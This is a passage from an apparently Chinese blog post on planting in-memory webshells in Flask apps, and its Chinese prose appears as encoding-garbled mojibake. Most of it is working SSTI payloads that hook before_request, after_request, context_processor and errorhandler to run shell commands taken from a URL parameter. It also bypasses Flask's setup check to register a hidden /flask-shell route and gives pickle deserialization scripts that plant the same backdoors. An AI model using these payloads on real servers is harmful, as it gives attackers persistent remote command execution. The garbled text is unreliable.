class="hljs-number">401</span><br></code></pre></td></tr></table></figure><p>å»çœ‹ä¸€ä¸‹å®ƒé‡Œé¢è°ƒç”¨çš„å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410181056847.png" alt="image-20241018105601756"></p><p>å¯ä»¥çœ‹åˆ°å®ƒè°ƒç”¨è¯¥æ–¹æ³•çš„å½¢å¼ï¼Œfå°±æ˜¯è®¿é—®å€¼ï¼Œæˆ‘ä»¬åªè¦åƒä½ç‰ˆæœ¬é‚£æ ·å†™ä¸€ä¸ªåŒ¿åçš„lambdaå‡½æ•°å³å¯</p><p>æ­£å¸¸èƒ½æ‰§è¡Œevalä¹‹åçš„payloadå½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;)<br></code></pre></td></tr></table></figure><p>æ”¹æˆèƒ½å¤Ÿæ¥å—å‚æ•°çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda : __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±åˆ©ç”¨lambdaå‡½æ•°æ¥è·å–getè¯·æ±‚å‚æ•°ç„¶åæ‰§è¡Œå‘½ä»¤æ¥å›æ˜¾</p><p><img src="https://cdn.clown2024.cn/202410181206135.png" alt="image-20241018120612584"></p><p><img src="https://cdn.clown2024.cn/202410181206831.png" alt="image-20241018120638777"></p><p>ä½†æ˜¯è¿™æ ·ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºlambdaå‡½æ•°æ˜¯ä¸€å®šä¼šæœ‰è¿”å›å€¼çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™æ ·æ‰“è¿›å»ååç»­çš„æœåŠ¡æ“ä½œéƒ½æ— æ³•è¿›è¡Œï¼Œä¼šå½±å“æ­£å¸¸ä¸šåŠ¡</p><blockquote><p>åœ¨æµ‹è¯•çš„è¿˜æœ‰æƒ…å†µå°±æ˜¯å¦‚æœpayloadæ‰“è¿›å»äº†ä½†æ˜¯åœ¨æ‰§è¡Œçš„æ—¶å€™å‡ºé”™äº†ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡å™¨ä¸€ç›´500.ä»»ä½•æ“ä½œéƒ½æ‰“ä¸äº†ï¼Œå› ä¸ºè¯¥é”™è¯¯ä»£ç å·²ç»è¢«æ’å…¥è¿›å»äº†ï¼Œä¸”ä¼šç¬¬ä¸€ä¸ªæ‰§è¡Œï¼Œè¿™æ—¶å€™å°±åªèƒ½é‡å¯æœåŠ¡äº†</p></blockquote><h2 id="appafter_request"><a href="#app-after-request" class="headerlink" title="@app.after_request"></a>@app.after_request</h2><p>é¡¾åæ€ä¹‰è¿™ä¸ªå°±æ˜¯åœ¨è¯·æ±‚ä¹‹åå¹²çš„äº‹ï¼Œæ€è·¯å’Œbefore_requestä¸€æ ·</p><p>æ­£å¸¸ç”¨æ³•</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.after_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">after_request</span>(<span class="hljs-params">response</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_request&quot;</span>)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>å…ˆå»çœ‹çœ‹ä»–çš„è°ƒç”¨å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410181233617.png" alt="image-20241018123326558"></p><p>è°ƒç”¨çš„å‡½æ•°åŒæ ·å¾ˆç±»ä¼¼ï¼Œåªä¸è¿‡ä»–çš„å‡½æ•°å¤šäº†ä¸€ä¸ªå‚æ•°è€Œå·²ï¼Œæ‰€ä»¥æˆ‘ä»¬åŒæ ·ç”¨ä¸Šé¢çš„payloadæ”¹ä¸€ä¸‹å³å¯</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda x: __import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410181247461.png" alt="image-20241018124743387"></p><p><img src="https://cdn.clown2024.cn/202410181247337.png" alt="image-20241018124755293"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸€å¼€å§‹æ‰“è¿›å»æ˜¯ä¼š500çš„ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰è®¾ç½®æ²¡æœ‰ä¼ é€’å‚æ•°cmdçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™ä»–çš„è¿”å›å€¼ä¸æ˜¯strå°±ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TypeError: invalid cmd type (&lt;class &#x27;NoneType&#x27;&gt;, expected string)<br></code></pre></td></tr></table></figure><p>ä½†ä¹Ÿæ˜¯èƒ½æ­£å¸¸æ‰“çš„</p><p>ç„¶åçœ‹åˆ°ä¸€ä¸ªè€ƒè™‘äº†ä¸ä¼ å‚æƒ…å†µçš„payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ä¸‹è¿™ä¸ªlambdaå‡½æ•°æˆ‘ä»¬æ˜¯éœ€è¦ç»™ä¸€ä¸ªå‚æ•°ï¼Œè€Œä¸”è¦make_responseæ¥è¿”å›å€¼ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TypeError: &#x27;str&#x27; object is not callable<br></code></pre></td></tr></table></figure><h2 id="appteardown_request"><a href="#app-teardown-request" class="headerlink" title="@app.teardown_request"></a>@app.teardown_request</h2><p>è¯¥è£…é¥°å™¨ä¹Ÿæ˜¯åœ¨è¯·æ±‚åè°ƒç”¨å‡½æ•°ï¼Œä»–çš„payloadå’Œafter_requestä¸€æ ·ï¼Œæ”¹ä¸€ä¸‹å‡½æ•°åå³å¯</p><p><img src="https://cdn.clown2024.cn/202410181631773.png" alt="image-20241018163151698"></p><p>ä¸è¿‡è¯¥å‡½æ•°çš„è¿”å›å€¼ä¼šè¢«å¿½ç•¥ï¼Œæ‰€ä»¥æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæœ‰ç‚¹é¸¡è‚‹ï¼Œä¸å¤ªç”¨å®ƒ</p><h2 id="appcontext_processor"><a href="#app-context-processor" class="headerlink" title="@app.context_processor"></a>@app.context_processor</h2><p>è¯¥è£…é¥°å™¨ç”¨äºæ³¨å†Œä¸€ä¸ªä¸Šä¸‹æ–‡å¤„ç†å™¨ï¼Œå¯ä»¥å°†ä¸€ä¸ªæ¨¡æ¿å­—å…¸æ³¨å†Œåˆ°æ¨¡æ¿ä¸Šä¸‹æ–‡ä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†æŸä¸ªåå­—å®šä¹‰ä¸ºæœ‰æ„ä¹‰çš„ä¸œè¥¿ï¼Œæ¯”å¦‚åƒæˆ‘ä»¬çš„ä¸€æ ·</p><p>ç„¶åä»–çš„å†…éƒ¨è°ƒç”¨å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202410181650115.png" alt="image-20241018165058047"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.template_context_processors[None].append(lambda : &#123;&#x27;clown&#x27;: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read() if &#x27;cmd&#x27;in request.args.keys() else None&#125;)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;], &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202410181654158.png" alt="image-20241018165411088"></p><p><img src="https://cdn.clown2024.cn/202410181654677.png" alt="image-20241018165421620"></p><h2 id="appteardown_appcontext"><a href="#app-teardown-appcontext" class="headerlink" title="@app.teardown_appcontext"></a>@app.teardown_appcontext</h2><p>ä»–çš„è°ƒç”¨å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410181705473.png" alt="image-20241018170522417"></p><p>è¯¥æ–¹æ³•æ˜¯åœ¨è¯·æ±‚ç»“æŸçš„æ—¶å€™è°ƒç”¨ï¼Œè¿™ä¸ªé˜¶æ®µå› ä¸ºè¯·æ±‚è¢«é”€æ¯äº†æˆ‘ä»¬ä¹Ÿå°±æ‹¿ä¸åˆ°ç›¸å…³æ¯”å¦‚urlå‚æ•°ä¹‹ç±»çš„ä¸œè¥¿ï¼Œå¦‚æœè¦ç”¨è¯¥è¯¥å‡½æ•°æ‰“å†…å­˜é©¬ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨è¯¥å‡½æ•°å‰å°±éœ€è¦é…åˆå…¶ä»–è£…é¥°å™¨å…ˆå°†requestå¯¹è±¡ä¿å­˜åˆ°Flaskçš„å…¨å±€å˜é‡ï¼Œå±äºæ˜¯éå¸¸é¸¡è‚‹ï¼Œæ‰€ä»¥å°±ä¸æ¢ç´¢äº†è¿™éƒ¨åˆ†ï¼Œå°±çŸ¥é“æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿</p><h2 id="apperrorhandler"><a href="#app-errorhandler" class="headerlink" title="@app.errorhandler"></a>@app.errorhandler</h2><p>ä¸€ä¸ªé”™è¯¯å¤„ç†çš„è£…é¥°å™¨</p><p>æ­£å¸¸ç”¨æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br></code></pre></td></tr></table></figure><p>å½“å‡ºç°404æ˜¯å°±å›è¿”å›error</p><p><img src="https://cdn.clown2024.cn/202410181730600.png" alt="image-20241018173016540"></p><p>é‚£æ˜¯ä¸æ˜¯åªè¦æ§åˆ¶ä»–çš„è°ƒç”¨å‡½æ•°éšä¾¿è®¿é—®404é¡µé¢å°±èƒ½å†™é©¬äº†å‘¢</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ï¼Œä»–çš„è°ƒç”¨å‡½æ•°å¦‚ä¸‹ï¼š</p><p>register_error_handler</p><p><img src="https://cdn.clown2024.cn/202410181732134.png" alt="image-20241018173251068"></p><p>code_or_exceptionå°±æ˜¯æˆ‘ä»¬å‰é¢ä¼ çš„çŠ¶æ€ç ï¼Œfå°±æ˜¯å¤„ç†å‡½æ•°</p><p>ç„¶åä»¿ç…§å‰é¢çš„å†™æ³•æ¥æ‰“ä¸€ä¸‹å†…å­˜é©¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;app.register_error_handler(404,lambda x :__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410182309853.png" alt="image-20241018230903769"></p><p>æ¬¸ä¼šå‘ç°å®ƒæŠ¥é”™äº†ï¼Œçœ‹ä¸€ä¸‹æŠ¥äº†ä»€ä¹ˆé”™å‘¢</p><p><img src="https://cdn.clown2024.cn/202410182309191.png" alt="image-20241018230934134"></p><p>å¾ˆç†Ÿæ‚‰çš„é”™è¯¯ï¼Œåœ¨å‰é¢ä½ç‰ˆæœ¬æˆ‘ä»¬å¼€å¯debugæ¨¡å¼çš„æ—¶å€™ä¹Ÿå‡ºç°è¿‡è¿™æ ·çš„é”™è¯¯ï¼Œè¯´æ˜register_error_handlerè¿™ä¸ªå‡½æ•°è¢«checkäº†</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥å»è°ƒè¯•ä¸€ä¸‹</p><p>å†™ä¸€ä¸ªæ­£å¸¸çš„è£…é¥°å™¨ç„¶åæ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202410182326928.png" alt="image-20241018232621872"></p><p>å»è®¿é—®ä¸€ä¸ª404é¡µé¢</p><p><img src="https://cdn.clown2024.cn/202410182327223.png" alt="image-20241018232742155"></p><p>çœ‹è°ƒç”¨æ ˆä»–ä¼šé©¬ä¸Šèµ°åˆ°è¿™ä¸ªcheckå‡½æ•°ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410182329373.png" alt="image-20241018232931317"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°register_error_handlerå‡½æ•°é‡Œé¢å®é™…ä¸Šåˆæ˜¯è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè€Œè¿™ä¸¤ä¸ªå‡½æ•°æ˜¯åœ¨checkä¹‹åï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°å°±å¯ä»¥ç»•è¿‡ä»–çš„checkæ£€æŸ¥äº†</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class]=lambda exc_class: __import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410181954570.png" alt="image-20241018195401485"></p><p><img src="https://cdn.clown2024.cn/202410181954846.png" alt="image-20241018195411798"></p><h2 id="ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±"><a href="#ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±" class="headerlink" title="ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±"></a>ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±</h2><p>è¯´å›add_url_ruleå‡½æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹ä»–çš„å…·ä½“æŠ¥é”™é€»è¾‘</p><p>é¦–å…ˆåœ¨@setupmethodä¸­è°ƒç”¨äº†checkå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410200010061.png" alt="image-20241019235616104"></p><p>è¿›åˆ°checkå‡½æ•°é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410200011769.png" alt="image-20241020001102100"></p><p>å¦‚æœ_got_first_requestè¿™ä¸ªå€¼ä¸ºTrueçš„è¯å°±ä¼šæŠ›å‡ºè¿™ä¸ªé”™è¯¯ï¼Œä»–çš„é»˜è®¤å€¼æ˜¯ä¸ºfalseï¼Œé‚£å°±è‚¯å®šæ˜¯åœ¨å“ªé‡Œè¢«èµ‹å€¼ä¸ºäº†Trueï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ç„¶åçœ‹è°ƒç”¨æ ˆ</p><p>å‘ç°ä»–åœ¨full_dispatch_requestè¿™ä¸ªæ–¹æ³•é‡Œé¢èµ‹å€¼ä¸ºäº†True</p><p><img src="https://cdn.clown2024.cn/202410200020962.png" alt="image-20241020002049880"></p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹add_url_ruleçš„å…·ä½“å®ç°ï¼Œç›´æ¥ç»•è¿‡å‡½æ•°ï¼Œèµ°ä¸€éä»–å†…éƒ¨çš„å®ç°æµç¨‹æ¥æ³¨å†Œè·¯ç”±</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@setupmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_url_rule</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        rule: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">        endpoint: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        view_func: ft.RouteCallable | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        provide_automatic_options: <span class="hljs-built_in">bool</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        **options: t.<span class="hljs-type">Any</span>,</span><br><span class="hljs-params">    </span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> endpoint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            endpoint = _endpoint_from_view_func(view_func)  <span class="hljs-comment"># type: ignore</span><br>        options[<span class="hljs-string">&quot;endpoint&quot;</span>] = endpoint<br>        methods = options.pop(<span class="hljs-string">&quot;methods&quot;</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># if the methods are not given and the view_func object knows its</span><br>        <span class="hljs-comment"># methods we can use that instead.  If neither exists, we go with</span><br>        <span class="hljs-comment"># a tuple of only ``GET`` as default.</span><br>        <span class="hljs-keyword">if</span> methods <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            methods = <span class="hljs-built_in">getattr</span>(view_func, <span class="hljs-string">&quot;methods&quot;</span>, <span class="hljs-literal">None</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;GET&quot;</span>,)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(methods, <span class="hljs-built_in">str</span>):<br>            <span class="hljs-keyword">raise</span> TypeError(<br>                <span class="hljs-string">&quot;Allowed methods must be a list of strings, for&quot;</span><br>                <span class="hljs-string">&#x27; example: @app.route(..., methods=[&quot;POST&quot;])&#x27;</span><br>            )<br>        methods = &#123;item.upper() <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> methods&#125;<br><br>        <span class="hljs-comment"># Methods that should always be added</span><br>        required_methods = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">getattr</span>(view_func, <span class="hljs-string">&quot;required_methods&quot;</span>, ()))<br><br>        <span class="hljs-comment"># starting with Flask 0.8 the view_func object can disable and</span><br>        <span class="hljs-comment"># force-enable the automatic options handling.</span><br>        <span class="hljs-keyword">if</span> provide_automatic_options <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            provide_automatic_options = <span class="hljs-built_in">getattr</span>(<br>                view_func, <span class="hljs-string">&quot;provide_automatic_options&quot;</span>, <span class="hljs-literal">None</span><br>            )<br><br>        <span class="hljs-keyword">if</span> provide_automatic_options <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OPTIONS&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> methods:<br>                provide_automatic_options = <span class="hljs-literal">True</span><br>                required_methods.add(<span class="hljs-string">&quot;OPTIONS&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                provide_automatic_options = <span class="hljs-literal">False</span><br><br>        <span class="hljs-comment"># Add the required methods now.</span><br>        methods |= required_methods<br><br>        rule_obj = self.url_rule_class(rule, methods=methods, **options)<br>        rule_obj.provide_automatic_options = provide_automatic_options  <span class="hljs-comment"># type: ignore[attr-defined]</span><br><br>        self.url_map.add(rule_obj)<br>        <span class="hljs-keyword">if</span> view_func <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            old_func = self.view_functions.get(endpoint)<br>            <span class="hljs-keyword">if</span> old_func <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> old_func != view_func:<br>                <span class="hljs-keyword">raise</span> AssertionError(<br>                    <span class="hljs-string">&quot;View function mapping is overwriting an existing&quot;</span><br>                    <span class="hljs-string">f&quot; endpoint function: <span class="hljs-subst">&#123;endpoint&#125;</span>&quot;</span><br>                )<br>            self.view_functions[endpoint] = view_func<br></code></pre></td></tr></table></figure><p>å‘ç°åœ¨å‡½æ•°æœ«å°¾çš„å¤„ç†ä¸­ï¼Œå°† <code>rule_obj</code> å¯¹è±¡æ·»åŠ åˆ°äº† <code>url_map</code> ä¸­ï¼Œä¹‹åå°† <code>view_func</code> ä½œä¸ºäº† <code>view_functions</code> å­—å…¸ä¸­ <code>endpoint</code> é”®çš„å€¼ï¼Œview_funcä»å­—é¢æ„æ€æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ä»–å°±æ˜¯é‚£ä¸ªè·¯ç”±å‡½æ•°ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è®²ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥æ“ä½œè¿™ä¸¤ä¸ªå˜é‡æ¥å®Œæˆä¸€æ¬¡æ‰‹åŠ¨çš„ <code>add_url_rule</code>ã€‚</p><p><code>url_map</code> å’Œ <code>view_functions</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">self.url_map = self.url_map_class(host_matching=host_matching)<br><br>url_map_classä¸ºmap<br><br>self.view_functions: dict[str, ft.RouteCallable] = &#123;&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ„é€ æˆ‘ä»¬çš„payloadäº†ï¼Œä½†æ˜¯éœ€è¦æ‰“ä¸¤æ¬¡ä¸ä¸€æ ·çš„payloadï¼Œä¸€æ¬¡æ·»åŠ url_mapï¼Œä¸€æ¬¡æ·»åŠ endpointï¼Œå¯ä»¥è‡ªå·±å»çœ‹çœ‹æºç å…·ä½“æ˜¯éœ€è¦æ€ä¹ˆä¼ å‚æ„é€ ï¼Œè¿™é‡Œç›´æ¥å†™payloadäº†</p><p>ç¬¬ä¸€æ¬¡payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.url_map.add(app.url_rule_class(&#x27;/flask-shell&#x27;, methods=[&#x27;GET&#x27;],endpoint=&#x27;shell&#x27;))<br>&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410200036738.png" alt="image-20241020003616645"></p><p>è¿™æ—¶å€™å·²ç»æ˜¯åˆ›å»ºäº†è·¯ç”±äº†ï¼Œä½†æ˜¯<code>view_functions</code> ä¸­å¹¶ä¸å­˜åœ¨è·¯ç”±æŒ‡å®šçš„ <code>endpoint</code> ä¼šå¯¼è‡´æŠ¥é”™</p><p>æ¥ä¸‹æ¥æ‰“ç¬¬äºŒæ¬¡payloadæ·»åŠ endpoint</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.view_functions.update(&#123;&#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&#125;)<br>&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410200040146.png" alt="image-20241020004011065"></p><p>å†å»è®¿é—®flask-shellè·¯ç”±å°±å¯ä»¥äº†</p><p><img src="https://cdn.clown2024.cn/202410200040499.png" alt="image-20241020004038426"></p><h1 id="pickleçš„payload"><a href="#pickleçš„payload" class="headerlink" title="pickleçš„payload"></a>pickleçš„payload</h1><p>å› ä¸ºä¸Šè¿°çš„payloadé™¤äº†ç”¨äºsstiï¼Œè¿˜å¯ä»¥ç”¨äºpickleè¿™é‡Œè®°å½•ä¸€ä¸‹<strong>gxngxngxnå¸ˆå‚…</strong>æ–‡ç« é‡Œé¢çš„payload</p><p><strong>before_request</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;clown&#x27;)).read())&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><p><strong>after_request</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;gxngxngxn&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;clown\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><p><strong>errorhandler</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;clown&#x27;)).read()&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><h1 id="ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload"><a href="#ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload" class="headerlink" title="ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload"></a>ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><ul><li><p>ä½ç‰ˆæœ¬çš„å †æ 